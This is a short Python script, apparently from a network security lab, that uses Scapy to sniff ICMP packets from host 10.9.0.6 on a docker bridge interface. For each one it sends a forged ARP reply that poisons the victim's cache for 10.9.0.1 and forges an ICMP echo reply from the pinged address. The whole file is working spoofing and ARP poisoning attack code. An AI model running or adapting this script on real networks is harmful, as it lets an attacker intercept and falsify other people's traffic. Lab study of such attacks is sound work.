#! /usr/bin/env python3

from scapy.all import *

def sniff_and_spoof(packet):
    
    if ICMP in packet:
        arp_reply= ARP(pdst = '10.9.0.6', hwdst = 'ff:ff:ff:ff:ff:ff', psrc = '10.9.0.1', hwsrc = '02:42:d3:b0:cf:97', op=2)
        send(arp_reply, verbose=0)
        
        ip = IP(src= packet[IP].dst, dst= packet[IP].src)
        icmp = ICMP(type= 0, id= packet[ICMP].id, seq= packet[ICMP].seq)

        raw_data= packet[Raw].load
        newpacket= ip/icmp/raw_data

        send(newpacket,verbose=0)
        
pkt = sniff(iface ='br-6fb853a6859a', filter='icmp and src host 10.9.0.6',prn=sniff_and_spoof)
